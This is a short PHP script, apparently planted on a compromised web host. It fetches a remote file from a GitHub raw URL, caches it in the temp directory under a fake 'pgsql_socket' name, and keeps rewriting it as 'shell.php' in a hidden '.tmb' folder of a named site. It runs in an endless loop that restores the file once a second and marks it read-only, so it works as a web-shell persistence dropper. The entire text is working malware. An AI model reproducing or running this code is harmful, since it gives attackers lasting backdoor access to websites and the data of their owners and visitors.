<?php

set_time_limit(0);

$files = [
    [
        'path' => '/home/coifurtk/pabriktasseminar.id/.tmb/shell.php',
        'url' => 'https://raw.githubusercontent.com/adolphburruss/files/refs/heads/main/test.php',
        'chmod' => 0444
    ],
];

$prefix = 'pgsql_socket';
$tempDir = sys_get_temp_dir();
$stopFile = $tempDir . '/stop';
$notifFile = $tempDir . '/finish';

foreach ($files as $key => $value) {
    $tempFile = $tempDir . "/{$prefix}_{$key}.sock";

    $files[$key]['tmp_file'] = $tempFile;

    if (!file_exists($tempFile)) {
        $fileContent = file_get_contents($files[$key]['url']);
        file_put_contents($tempFile, $fileContent);
    }
}


while (true && !file_exists($stopFile)) {
    foreach ($files as $key => $value) {
        $filePath = $files[$key]['path'];
        $tmpFilePath = $files[$key]['tmp_file'];
        $dirPath = dirname($filePath);

        if (!is_dir($dirPath)) {
            mkdir($dirPath, 0755, true);
        }

        if (!file_exists($filePath) || hash_file('md5', $tmpFilePath) != hash_file('md5', $filePath)) {
            $handle = fopen($filePath, 'w');
            if ($handle) {
                fwrite($handle, file_get_contents($tmpFilePath));
                fclose($handle);

                chmod($filePath, $files[$key]['chmod']);
            }
        }
    }
    sleep(1);
}

file_put_contents($notifFile, 'finish');
